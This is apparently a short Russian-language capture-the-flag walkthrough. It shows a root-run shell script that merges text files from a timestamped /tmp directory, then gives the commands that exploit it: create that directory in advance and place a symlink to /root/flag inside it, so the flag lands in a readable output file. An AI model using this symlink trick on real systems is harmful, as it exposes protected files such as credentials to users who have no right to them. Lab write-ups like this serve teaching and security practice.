находим скрипте /opt/syslog.sh
```
#!/bin/bash
TMPDIR=$(date "+/tmp/tmpdir-%Y-%m-%d-%H%M%S")
mkdir "$TMPDIR"
date > "$TMPDIR/date.txt"
w > "$TMPDIR/users.txt"
cat $TMPDIR/*.txt > /opt/syslog.txt
rm -rf "$TMPDIR"
```
создаем каталог mkdir -p tmpdir-2025-06-20-084201 (время в каталоге должен быть на несколько минут позже текущего) и в нем создаем символическую ссылку ln -s /root/flag flag.txt
проверяем файл /opt/syslog.txt и забираем флаг